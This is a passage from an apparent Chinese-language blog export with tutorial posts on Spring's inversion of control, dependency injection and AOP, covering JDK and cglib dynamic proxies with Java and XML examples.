    <content><![CDATA[<h1 id="一、IoC是什么"><a href="#一、IoC是什么" class="headerlink" title="一、IoC是什么"></a>一、IoC是什么</h1><p>　Ioc—Inversion of Control，即“控制反转”，不是什么技术，而是一种设计思想。在Java开发中，Ioc意味着将你设计好的对象交给容器控制，而不是传统的在你的对象内部直接控制。</p>
<blockquote>
<ul>
<li><p><strong>谁控制谁，控制什么</strong><br> 传统Java SE程序设计，我们直接在对象内部通过new进行创建对象，是程序主动去创建依赖对象；而IoC是有专门一个容器来创建这些对象，即由Ioc容器来控制对象的创建；谁控制谁？当然是IoC<br>容器控制了对象；控制什么？那就是主要控制了外部资源获取（不只是对象包括比如文件等）。</p>
</li>
<li><p><strong>为何是反转，哪些方面反转了</strong><br>有反转就有正转，传统应用程序是由我们自己在对象中主动控制去直接获取依赖对象，也就是正转；而反转则是由容器来帮忙创建及注入依赖对象；为何是反转？因为由容器帮我们查找及注入依赖对象，对象只是被动的接受依赖对象，所以是反转；哪些方面反转了？依赖对象的获取被反转了。</p>
</li>
</ul>
</blockquote>
<h1 id="二、IoC案例引入"><a href="#二、IoC案例引入" class="headerlink" title="二、IoC案例引入"></a>二、IoC案例引入</h1><p>① 我们先写一个UserDao接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>② 再写UserDao的实现类-UserDaoImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;获取用户数据...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>③ 写一个UserService接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>④ 最后写一个UserService的实现类-UserServiceImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">UserDao</span> <span class="variable">userDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserDaoImpl</span>();</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">		userDao.getUser();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>⑤ 现在来获取用户数据吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testGetUser</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();</span><br><span class="line">	userService .getUser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这也是大家惯用的方式，现在我们对其做出一些修改。<br><strong>将UserDao的实现类增加一个</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoMySqlImpl</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;MySql获取用户数据...&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>紧接着我们要去使用MySql的话 , 我们就需要去service实现类里面修改对应的实</strong>现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">UserDao</span> <span class="variable">userDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserDaoMySqlImpl</span>();</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">		userDao.getUser();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们再增加一个UserDao的实现类，使用oracle存储数据，那么我们又要去UserService<br>类里更改对应实例的获取。在开发中，这种需求是非常大的 ,因此我们惯用的方式有点不适用了, 甚至反人类。 每次变动 , 都需要修改大量代码 ， 这种设计的耦合性太高, 牵一发而动全身 。</p>
<blockquote>
<p><strong>解决方案</strong><br>我们可以在需要用到某个实例的地方 , 不去实现它 , 而是留出一个接口 , 利用set , 我们去代码里修改下 。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">	<span class="keyword">private</span> UserDao userDao;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 利用set实现</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserDao</span><span class="params">(UserDao userDao)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">		userDao.getUser();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样一来，他们已经发生了根本性的变化，很多地方都不一样了。仔细去思考一下，以前所有东西都是由程序去进行控制创建， 而现在是由我们自行控制创建对象，把主动权交给了调用者。 程序不用去管怎么创建，怎么实现了。它只负责提供一个接口。</p>
<p><strong>这种思想， 从本质上解决了问题，我们程序员不再去管理对象的创建了， 更多的去关注业务的实现。耦合性大大降低。这也就是IOC的原型 !</strong></p>
<h1 id="三、IoC与DI"><a href="#三、IoC与DI" class="headerlink" title="三、IoC与DI"></a>三、IoC与DI</h1><p><strong>控制反转IoC(Inversion of Control)，是一种<code>设计思想</code>，DI(依赖注入)是实现IoC的一种<code>方法</code>。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，耦合性极高。但控制反转后将对象的创建转移给第三方，降低了程序间的耦合性，在我看来，控制反转就是获得依赖对象的方式反转了。</strong><br><strong>IoC是Spring框架的核心内容，使用多种方式完美的实现了IoC，可以使用XML配置，也可以使用注解，以及可以基于Java配置类实现完全脱离xml配置文件实现IoC。</strong></p>
<blockquote>
<p><strong>控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（DependencyInjection,DI）。</strong></p>
</blockquote>
<h1 id="四、-Spring中的IoC与DI"><a href="#四、-Spring中的IoC与DI" class="headerlink" title="四、 Spring中的IoC与DI"></a>四、 Spring中的IoC与DI</h1><p><strong>回到上述案例，我们最终用setter方法解决了程序的耦合性，在Spring中，我们只需在Spring核心配置文件中使用<code>&lt;bean&gt;</code>标签注册每一个类，标签里添加对应属性，就可以实现对象的创建。</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;mysqlUserDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoMySqlImpl&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;oracleUserDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoOracleImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.service.impl.UserServiceImpl&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--引用 UserDaoMySqlImpl--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;mysqlUserDao&quot;</span>/&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--如果想引用 UserDaoOracleImpl，只需将代码改为这一句--&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       &lt;property name=&quot;userDao&quot; ref=&quot;oracleUserDao&quot;/&gt;</span></span><br><span class="line"><span class="comment">       --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">	ApplicationContext app= <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">	<span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> (UserService )app.getBean(<span class="string">&quot;userService&quot;</span>);</span><br><span class="line">	userService.getUser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>UserService 对象是谁创建的 ?</strong><br> <strong>UserService 对象是由Spring创建的</strong></li>
</ul>
<hr>
<ul>
<li><strong>UserService 对象的属性是怎么设置的 ?</strong><br><strong>UserService 对象的属性是由Spring容器设置的</strong></li>
</ul>
</blockquote>
<p><strong>对象已经转交给Spring控制了，这就叫控制反转；属性的设置也交给Spring设置了，这就是依赖注入</strong></p>
<blockquote>
<ul>
<li><strong>控制 : 谁来控制对象的创建 , 传统应用程序的对象是由程序本身控制创建的 ；使用Spring后 , 对象是由Spring来创建的</strong></li>
</ul>
<hr>
<ul>
<li><strong>反转 : 程序本身不创建对象 , 而变成被动的接收对象 .</strong></li>
</ul>
<hr>
<ul>
<li><strong>依赖注入 : 就是利用set方法来进行注入的.</strong></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring面向切面编程-AOP</title>
    <url>/posts/7856357f.html</url>
    <content><![CDATA[<h1 id="一、AOP简介"><a href="#一、AOP简介" class="headerlink" title="一、AOP简介"></a>一、AOP简介</h1><ul>
<li>AOP 为（Aspect Oriented Programming）<code>面向切面编程</code>，是通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。</li>
<li>AOP 是 OOP（Object Oriented Programming）<code>面向对象编程</code> 的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。</li>
</ul>
<blockquote>
<ul>
<li><strong>Spring理念：无侵入式&#x2F;无入侵式</strong></li>
</ul>
</blockquote>
<h2 id="1-AOP作用及优势"><a href="#1-AOP作用及优势" class="headerlink" title="1. AOP作用及优势"></a>1. AOP作用及优势</h2><blockquote>
<ul>
<li><strong>作用：在<code>不惊动原始设计</code>的基础上为其进行<code>功能增强</code>。</strong></li>
<li><strong>优势：减少重复代码，提高开发效率，并且便于维护。</strong></li>
</ul>
</blockquote>
<h2 id="2-AOP底层实现"><a href="#2-AOP底层实现" class="headerlink" title="2. AOP底层实现"></a>2. AOP底层实现</h2><blockquote>
<p>AOP的底层是通过Spring提供的<code>动态代理技术</code>实现。在运行期间，Spring通过动态代理技术动态的生成代理对象，代理对象方法执行时进行增强功能的介入，再去调用目标对象的方法，从而完成功能的增强。</p>
</blockquote>
<h2 id="3-AOP的动态代理技术"><a href="#3-AOP的动态代理技术" class="headerlink" title="3. AOP的动态代理技术"></a>3. AOP的动态代理技术</h2><p>常用的动态代理技术</p>
<ul>
<li><strong><code>JDK 代理</code></strong> : 基于接口的动态代理技术</li>
<li>**<code>cglib 代理</code>**：基于父类的动态代理技术 （Spring集成的第三方技术）<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155003.png"></li>
</ul>
<h3 id="1-JDK动态代理"><a href="#1-JDK动态代理" class="headerlink" title="1. JDK动态代理"></a>1. JDK动态代理</h3><p>JDK 动态代理是基于拦截器和反射实现的，不需要第三方库支持，只需要 JDK 环境即可</p>
<ul>
<li>必须实现 InvocationHandler 接口；</li>
<li>使用 Proxy.newProxyInstance 产生代理对象；</li>
<li>被代理的对象必须要实现接口；</li>
<li>内部采用asm技术动态生成字节码；</li>
</ul>
<p><strong>步骤如下：</strong><br><strong>① 定义目标接口，<code>TargetInterface</code></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TargetInterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 定义目标类，实现<code>TargetInterface</code></strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Target</span> <span class="keyword">implements</span> <span class="title class_">TargetInterface</span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行method......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>③ 定义增强类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Advice</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;before......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;after......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>④ 动态代理代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="comment">// 目标对象</span></span><br><span class="line">	<span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>();</span><br><span class="line">	<span class="comment">// 目标对象类加载器</span></span><br><span class="line">	<span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> target.getClass().getClassLoader();</span><br><span class="line">	<span class="comment">// 增强对象</span></span><br><span class="line">	<span class="type">Advice</span> <span class="variable">advice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Advice</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 创建代理对象 三个参数</span></span><br><span class="line">	<span class="type">TargetInterface</span> <span class="variable">proxy</span> <span class="operator">=</span> (TargetInterface) Proxy.newProxyInstance(</span><br><span class="line">			classLoader,</span><br><span class="line">			<span class="comment">// 目标对相关相同的接口字节码对象数组</span></span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TargetInterface.class&#125;,</span><br><span class="line">			<span class="comment">// 返回值就是动态生成的代理对象</span></span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">				<span class="comment">// 调用代理对象的任何方法，实质执行的都是invoke方法</span></span><br><span class="line">				<span class="meta">@Override</span></span><br><span class="line">				<span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">					<span class="comment">// 前置增强</span></span><br><span class="line">					advice.before();</span><br><span class="line">					<span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);<span class="comment">// 执行目标方法</span></span><br><span class="line">					<span class="comment">// 后置增强</span></span><br><span class="line">					advice.after();</span><br><span class="line">					<span class="keyword">return</span> result ;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">	);</span><br><span class="line">	<span class="comment">// 调用代理对象的方法</span></span><br><span class="line">	proxy.method();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>执行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155003.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                          InvocationHandler h)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalArgumentException</span><br></pre></td></tr></table></figure>
<p><strong>代码本身很简单，最重要的就是Proxy.newProxyInstance 这个方法，理解这里面的几个参数至关重要，分别说明下几个参数的含义：</strong></p>
<blockquote>
<ul>
<li><code>classLoader</code>，类加载器；</li>
<li><code>interfaces</code>，目标对象接口；</li>
<li><code>InvocationHandler</code>，真正完成相关方法反射代理的处理器；</li>
</ul>
<hr>
<p><strong>JDK动态代理，其关键的步骤就是在InvocationHandler 中执行目标实现类的方法反射调用</strong></p>
</blockquote>
<hr>
<h3 id="2-cglib动态代理"><a href="#2-cglib动态代理" class="headerlink" title="2. cglib动态代理"></a>2. cglib动态代理</h3><p>JDK实现动态代理需要实现类通过接口定义业务方法，对于没有接口的类，如何实现动态代理呢，这就需要cglib了；<br>cglib采用了非常底层的字节码技术，其原理是通过字节码技术为一个类创建子类，并在子类中采用方法拦截的技术拦截所有父类方法的调用，顺势织入横切逻辑。<br><strong>步骤如下：</strong><br><strong>① 导入cglib坐标（由于cglib是第三方的工具，所以我们在使用过之前需要导入cglib的坐标，在Spring早期的版本中需要我们手动导入，但是Spring高版本已经将cglib集成到了Spring框架里，所以我们可以直接使用）</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155003.png"></p>
<p><strong>② 定义目标类</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Target</span>  &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行method......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>③ 定义增强类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Advice</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;before......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;after......&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>④ 动态代理代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="comment">// 目标对象</span></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>();</span><br><span class="line">	<span class="comment">// 获得增强对象</span></span><br><span class="line">	<span class="type">Advice</span> <span class="variable">advice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Advice</span>();</span><br><span class="line">	<span class="comment">// 创建代理对象  基于cglib</span></span><br><span class="line">	<span class="comment">// 1、创建增强器</span></span><br><span class="line">	<span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">	<span class="comment">// 2、设置父类</span></span><br><span class="line">	enhancer.setSuperclass(Target.class);</span><br><span class="line">	<span class="comment">// 3、设置回调</span></span><br><span class="line">	enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">MethodInterceptor</span>() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o, Method method, Object[] objects, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">			<span class="comment">// 执行前置增强</span></span><br><span class="line">			advice.before();</span><br><span class="line">			<span class="comment">// 执行目标方法</span></span><br><span class="line">			<span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">			<span class="comment">// 执行后置增强</span></span><br><span class="line">			advice.after();</span><br><span class="line">			<span class="keyword">return</span> invoke;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">	<span class="comment">// 4、创建代理对象</span></span><br><span class="line">	<span class="type">Target</span> <span class="variable">proxy</span> <span class="operator">=</span> (Target) enhancer.create();</span><br><span class="line">	<span class="comment">// 执行代理对象的方法 最终执行的是目标方法</span></span><br><span class="line">	proxy.method();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>执行效果：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155003.png"></p>
<h2 id="4-AOP核心概念"><a href="#4-AOP核心概念" class="headerlink" title="4. AOP核心概念"></a>4. AOP核心概念</h2><p>Spring 的 AOP 实现底层就是对上述动态代理的代码进行了封装，封装后我们只需要对需要关注的部分进行代码编写，并通过配置的方式完成指定目标的方法增强。<br>在正式讲解 AOP 的操作之前，我们必须理解 AOP 的相关术语，常用的术语如下：</p>
<blockquote>
<ul>
<li>Target（目标对象）：代理的目标对象</li>
<li>Proxy （代理）：一个类被 AOP 织入增强后，就产生一个结果代理类</li>
<li><code>Joinpoint（连接点）</code>：所谓连接点是指那些被拦截到的点。在Spring中，这些点指的是<code>方法</code>，因为Spring只支持方法类型的连接点。</li>
<li><code>Pointcut（切入点）</code>：所谓切入点是指我们要对哪些 Joinpoint 进行拦截的定义。</li>
<li><code>Advice（通知/ 增强）</code>：在切入点处执行的操作，也就是指拦截到 Joinpoint 之后所要做的<code>共性功能</code>，在Spring中，功能最终以方法的形式呈现。</li>
<li><code>Aspect（切面）</code>：是切入点和通知（引介）的结合，描述通知与切入点的<code>对应关系</code>。</li>
<li><code>Weaving（织入）</code>：是指把增强应用到目标对象来创建新的代理对象的过程。Spring采用动态代理织入，而AspectJ采用编译期织入和类装载期织入。</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155003.png"><br><strong>网络上有张图，我觉得非常传神，贴在这里供大家观详：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155003.png"></p>
<h1 id="二、AOP开发明确事项"><a href="#二、AOP开发明确事项" class="headerlink" title="二、AOP开发明确事项"></a>二、AOP开发明确事项</h1><h2 id="1-编写内容"><a href="#1-编写内容" class="headerlink" title="1. 编写内容"></a>1. 编写内容</h2><ul>
<li>编写核心业务代码（目标类的目标方法）</li>
<li>编写切面类，切面类中有通知(增强功能方法)</li>
<li>在配置文件中，配置织入关系，即将哪些通知与哪些连接点进行结合</li>
</ul>
<h2 id="2-AOP-技术实现的内容"><a href="#2-AOP-技术实现的内容" class="headerlink" title="2. AOP 技术实现的内容"></a>2. AOP 技术实现的内容</h2><p>Spring 框架监控切入点方法的执行。一旦监控到切入点方法被运行，使用代理机制，动态创建目标对象的代理对象，根据通知类别，在代理对象的对应位置，将通知对应的功能织入，完成完整的代码逻辑运行。</p>
<h2 id="3-AOP-底层使用哪种代理方式"><a href="#3-AOP-底层使用哪种代理方式" class="headerlink" title="3. AOP 底层使用哪种代理方式"></a>3. AOP 底层使用哪种代理方式</h2><p>在 spring 中，框架会根据目标类是否实现了接口来决定采用哪种动态代理的方式。</p>
<ul>
<li>默认使用 jdk动态代理，这样可以代理所有的接口类型；</li>
<li>如果目标对象没有实现任何接口，则默认采用cglib代理；</li>
<li>可强制使用cglib，指定<code>proxy-target-class = &quot;true&quot;</code> 或者基于注解<code>@EnableAspectJAutoProxy(proxyTargetClass = true)</code></li>
</ul>
<h1 id="三、基于XML的AOP开发"><a href="#三、基于XML的AOP开发" class="headerlink" title="三、基于XML的AOP开发"></a>三、基于XML的AOP开发</h1><h2 id="1-入门案例"><a href="#1-入门案例" class="headerlink" title="1. 入门案例"></a>1. 入门案例</h2><p><strong>① 导入坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入spring的context坐标，context依赖aop--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- aspectj的织入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>② 创建目标接口和目标类（内部有切点）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TargetInterface</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

